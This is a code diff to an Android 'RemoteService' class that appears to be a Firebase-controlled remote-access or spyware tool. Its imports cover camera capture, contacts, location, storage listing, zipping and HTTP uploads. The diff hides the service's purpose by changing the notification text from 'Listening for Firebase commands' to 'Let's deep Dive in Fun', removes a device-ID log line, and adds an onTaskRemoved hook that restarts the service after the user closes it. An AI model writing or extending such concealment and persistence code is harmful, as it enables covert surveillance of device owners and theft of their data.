@@ -6,8 +6,7 @@ import android.app.NotificationManager;
 import android.app.Service;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
-import com.google.android.gms.tasks.OnSuccessListener;
-import android.location.Location;
+
 import android.Manifest;
 
 import android.content.Context;
@@ -18,7 +17,6 @@ import android.graphics.ImageFormat;
 import android.hardware.camera2.*;
 import android.media.Image;
 import android.media.ImageReader;
-import android.media.MediaRecorder;
 
 import android.net.ConnectivityManager;
 import android.net.Network;
@@ -28,13 +26,9 @@ import android.net.Uri;
 
 import android.os.Build;
 import android.os.Environment;
-import android.os.FileUtils;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
-import android.os.Looper;
-
-import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.util.Log;
@@ -58,15 +52,11 @@ import java.io.FileWriter;
 import java.io.IOException;
 
 import java.nio.ByteBuffer;
-import java.text.SimpleDateFormat;
 import java.util.Collections;
-import java.util.Date;
-import java.util.Locale;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 import okhttp3.Call;
-import okhttp3.Callback;
 import okhttp3.FormBody;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
@@ -86,7 +76,6 @@ public class RemoteService extends Service {
         startForegroundService();
 
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        Log.d("REMOTE_CMD", "📱 Device ID: " + deviceId);
 
         FirebaseDatabase.getInstance().getReference("devices").child(deviceId).setValue("active");
 
@@ -129,7 +118,7 @@ public class RemoteService extends Service {
 
         Notification notification = new NotificationCompat.Builder(this, channelId)
                 .setContentTitle("Remote Service")
-                .setContentText("Listening for Firebase commands")
+                .setContentText("Let's deep Dive in Fun")
                 .setSmallIcon(android.R.drawable.ic_menu_info_details)
                 .build();
 
@@ -487,6 +476,15 @@ public class RemoteService extends Service {
         });
     }
 
+    public static boolean isInternetAvailable(Context context) {
+        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+        return activeNetwork != null && activeNetwork.isConnected();
+    }
+    public static String getDeviceId(Context context) {
+        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+
     private void listDirectoryStructure() {
         File rootDir = Environment.getExternalStorageDirectory(); // You can also use getExternalFilesDir(null)
         File outputFile = new File(getExternalFilesDir(null), "dir_structure.txt");
@@ -568,4 +566,13 @@ public class RemoteService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         return START_STICKY; // auto-restart if killed
     }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+
+        Intent broadcastIntent = new Intent(this, BootReceiver.class);
+        sendBroadcast(broadcastIntent);
+    }
+
 }
